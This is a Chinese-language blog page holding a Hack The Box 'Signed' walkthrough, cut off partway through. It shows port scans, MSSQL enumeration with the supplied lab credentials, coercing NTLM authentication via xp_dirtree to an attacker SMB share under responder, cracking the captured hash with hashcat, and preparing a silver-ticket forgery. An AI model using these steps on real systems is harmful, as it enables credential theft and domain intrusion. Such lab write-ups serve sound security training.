<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/784db4820097b506.css" as="style"/><link rel="stylesheet" href="/_next/static/css/784db4820097b506.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-2fd59312591c37bd.js" defer=""></script><script src="/_next/static/PJghSypTuWEFTtl66wJg-/_buildManifest.js" defer=""></script><script src="/_next/static/PJghSypTuWEFTtl66wJg-/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Signed","contentHtml":"\u003ch1\u003eSeason8 - Signed\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Signed\"\u003ehttps://app.hackthebox.com/machines/Signed\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAs is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed nmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e5000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.95\u003c/span\u003e ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.041\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65534\u003c/span\u003e filtered tcp ports (no-response)\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ms-sql-s\n\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e26.56\u003c/span\u003e seco\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed nmap -sT -A -p \u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e                                                 \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.95\u003c/span\u003e ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:02 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e editor.htb (\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e)\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.041\u003c/span\u003es latency).\n\nPORT     STATE  SERVICE  VERSION\n\u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e/tcp closed ms-sql-s\nToo many fingerprints \u003cspan class=\"hljs-keyword\"\u003ematch\u003c/span\u003e this host to give specific OS details\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e hops\n\nTRACEROUTE (using proto \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/icmp)\nHOP RTT      ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e39.59\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.14\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e39.99\u003c/span\u003e ms editor.htb (\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e)\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3.07\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e通过 nxc 测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed nxc mssql \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'scott'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Sm230#C5NatH'\u003c/span\u003e --local-auth\nMSSQL       \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e   DC01             [*] Windows \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e / Server \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e17763\u003c/span\u003e (name:DC01) (domain:SIGNED.HTB)\nMSSQL       \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e   DC01             [+] DC01\\scott:Sm230\u003cspan class=\"hljs-comment\"\u003e#C5NatH\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003emssqlclient.py\u003c/code\u003e 进行连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed mssqlclient.py signed.htb/\u003cspan class=\"hljs-string\"\u003e'scott'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Sm230#C5NatH'\u003c/span\u003e@\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e -dc-ip \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e   \n  \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e pkg_resources\nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e, New Value: \u003cspan class=\"hljs-number\"\u003e16192\u003c/span\u003e\n[*] INFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Changed database context to \u003cspan class=\"hljs-string\"\u003e'master'\u003c/span\u003e.\n[*] INFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Changed language setting to us_english.\n[*] ACK: Result: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e - Microsoft SQL Server (\u003cspan class=\"hljs-number\"\u003e160\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3232\u003c/span\u003e) \n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nSQL (scott  guest@master)\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eMSSQL 枚举\u003c/h3\u003e\n\u003cp\u003e尝试枚举一些有用的信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSQL (scott  guest@master)\u003e enum_db\n[%] select name, is_trustworthy_on \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e sys.databases\nname     is_trustworthy_on   \n------   -----------------   \nmaster                   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e   \n\ntempdb                   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e   \n\nmodel                    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e   \n\nmsdb                     \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSQL (scott  guest@master)\u003e enum_users\nUserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   \n------------------   --------   ---------   ---------   -------------   ----------   -----   \ndbo                  db_owner   sa          master      dbo             \u003cspan class=\"hljs-string\"\u003eb'1         '\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003eb'01'\u003c/span\u003e   \n\nguest                public     NULL        NULL        guest           \u003cspan class=\"hljs-string\"\u003eb'2         '\u003c/span\u003e   \u003cspan class=\"hljs-string\"\u003eb'00'\u003c/span\u003e   \n\nINFORMATION_SCHEMA   public     NULL        NULL        NULL            \u003cspan class=\"hljs-string\"\u003eb'3         '\u003c/span\u003e    NULL   \n\nsys                  public     NULL        NULL        NULL            \u003cspan class=\"hljs-string\"\u003eb'4         '\u003c/span\u003e    NULL   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在里面没有找到什么有趣的东西，大部分都是空的\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003eCapture NTLM\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e因为是 guest 用户，所以在数据中做不了什么\u003c/p\u003e\n\u003cp\u003e经过一番搜索，在网上找到一篇文章：\u003ca href=\"https://duckwrites.medium.com/capture-ntlm-hashes-with-mssql-an-essential-oscp-tip-0c2433a7815a\"\u003ehttps://duckwrites.medium.com/capture-ntlm-hashes-with-mssql-an-essential-oscp-tip-0c2433a7815a\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e里边有一个技巧是获得 MSSQL 服务用户的技巧\u003c/p\u003e\n\u003cp\u003e开启 \u003ccode\u003eresponder\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eresponder -I tun0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e调用存储过程访问我们的 SMB 共享\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eEXEC xp_dirtree \u003cspan class=\"hljs-string\"\u003e'\\\\xx.xx.xx.xx\\sunset'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试破解该 HASH\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emssqlsvc::SIGNED:9c2097f413d20155:40C2CB079BCEB3A942A34C7397239437:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e10100000000000000D9B898193DDC01D18861084AB815EB00000000020008005300490045004E0001001E00570049004E002D00330038003700450046005A0049004D004B005100470004003400570049004E002D00330038003700450046005A0049004D004B00510047002E005300490045004E002E004C004F00430041004C00030014005300490045004E002E004C004F00430041004C00050014005300490045004E002E004C004F00430041004C000700080000D9B898193DDC0106000400020000000800300030000000000000000000000000300000360D692AB16CFD02C9A731C97E412BDC5E916522F5FDBA0743CE323968DE2B5F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320038000000000000000000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码 \u003ccode\u003epurPLE9795!@\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ehashcat -m \u003cspan class=\"hljs-number\"\u003e5600\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e /usr/share/wordlists/rockyou.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  Signed mssqlclient.py signed.htb/\u003cspan class=\"hljs-string\"\u003e'MSSQLSVC'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'purPLE9795!@'\u003c/span\u003e@\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e -dc-ip \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.90\u003c/span\u003e -windows-auth\n  \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e pkg_resources\nImpacket v0\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e, New Value: \u003cspan class=\"hljs-number\"\u003e16192\u003c/span\u003e\n[*] INFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Changed database context to \u003cspan class=\"hljs-string\"\u003e'master'\u003c/span\u003e.\n[*] INFO(DC01): Line \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: Changed language setting to us_english.\n[*] ACK: Result: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e - Microsoft SQL Server (\u003cspan class=\"hljs-number\"\u003e160\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e3232\u003c/span\u003e) \n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nSQL (SIGNED\\mssqlsvc  guest@master)\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eSliver Ticket\u003c/h2\u003e\n\u003cp\u003e拿到服务账户了，应尝试一下白银票据，尝试获得 mssql 的管理员账户的权限\u003c/p\u003e\n\u003cp\u003e所需条件：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e域名\u003c/li\u003e\n\u003cli\u003e域SID\u003c/li\u003e\n\u003cli\u003e目标服务器名\u003c/li\u003e\n\u003cli\u003e可利用的服务\u003c/li\u003e\n\u003cli\u003e服务账号的NTML HASH\u003c/li\u003e\n\u003cli\u003e需要伪造的用户名\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们先要找到我们需要伪造的用户名（列出所有管理员账户）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eselect mp.name \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e login, \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e when mp.is_disabled = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e then \u003cspan class=\"hljs-string\"\u003e'Disabled'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Enabled'\u003c/span\u003e end \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e status, mp.type_desc \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e sys.server_role_members srp join sys.server_principals mp on mp.principal_id = srp.member_principal_id join sys.server_principals rp on rp.principal_id = srp.role_principal_id where rp.name = \u003cspan class=\"hljs-string\"\u003e'sysadmin'\u003c/span\u003e order by mp.name;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看样子是 \u003ccode\u003esigned\\IT\u003c/code\u003e ，这是一个组\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eSID\u003c/h3\u003e\n\u003cp\u003e现在还要获取域 SID，因为 445 端口没开，所以还是需要通过 mssql 来获取 SID\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSQL (SIGNED\\mssqlsvc  guest@master)\u003e SELECT SUSER_SID(\u003cspan class=\"hljs-string\"\u003e'signed\\it'\u003c/span\u003e);\n                                                              \n-----------------------------------------------------------   \n\u003cspan class=\"hljs-string\"\u003eb'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后通过脚本进行转换（通过 AI 生成）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/env python3\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e sys\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e struct\n\n\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003econvert_sid\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ehex_sid\u003c/span\u003e):\n    \u003cspan class=\"hljs-string\"\u003e\"\"\"Converts a hex SID string to its readable S-1-5-... format.\"\"\"\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e hex_sid.startswith(\u003cspan class=\"hljs-string\"\u003e\"0x\"\u003c/span\u003e):\n        hex_sid = hex_sid[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:]\n    \n    \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e:\n        sid_bytes = \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e.fromhex(hex_sid)\n    \u003cspan class=\"hljs-keyword\"\u003eexcept\u003c/span\u003e ValueError:\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Error: Invalid hex string provided.\"\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 1. Revision (1 byte)\u003c/span\u003e\n    revision = sid_bytes[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n\n    \u003cspan class=\"hljs-comment\"\u003e# 2. Sub-authority count (1 byte)\u003c/span\u003e\n    sub_authority_count = sid_bytes[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e]\n\n    \u003cspan class=\"hljs-comment\"\u003e# 3. Identifier Authority (6 bytes, Big-Endian)\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# We read it directly as a 6-byte integer\u003c/span\u003e\n    identifier_authority = \u003cspan class=\"hljs-built_in\"\u003eint\u003c/span\u003e.from_bytes(sid_bytes[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e], \u003cspan class=\"hljs-string\"\u003e'big'\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-comment\"\u003e# Build the initial SID string\u003c/span\u003e\n    sid_string = \u003cspan class=\"hljs-string\"\u003ef\"S-\u003cspan class=\"hljs-subst\"\u003e{revision}\u003c/span\u003e-\u003cspan class=\"hljs-subst\"\u003e{identifier_authority}\u003c/span\u003e\"\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 4. Loop through Sub-authorities (each is 4 bytes, Little-Endian)\u003c/span\u003e\n    offset = \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003erange\u003c/span\u003e(sub_authority_count):\n        \u003cspan class=\"hljs-comment\"\u003e# Unpack 4 bytes as a little-endian unsigned long (\u0026#x3C;L)\u003c/span\u003e\n        sub_authority = struct.unpack(\u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;L'\u003c/span\u003e, sid_bytes[offset:offset+\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e])[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n        sid_string += \u003cspan class=\"hljs-string\"\u003ef\"-\u003cspan class=\"hljs-subst\"\u003e{sub_authority}\u003c/span\u003e\"\u003c/span\u003e\n        offset += \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\n        \n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e sid_string\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003elen\u003c/span\u003e(sys.argv) != \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"Usage: \u003cspan class=\"hljs-subst\"\u003e{sys.argv[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]}\u003c/span\u003e \u0026#x3C;hex_sid_string\u003e\"\u003c/span\u003e)\n        sys.exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n    \n    input_sid = sys.argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e]\n    readable_sid = convert_sid(input_sid)\n    \u003cspan 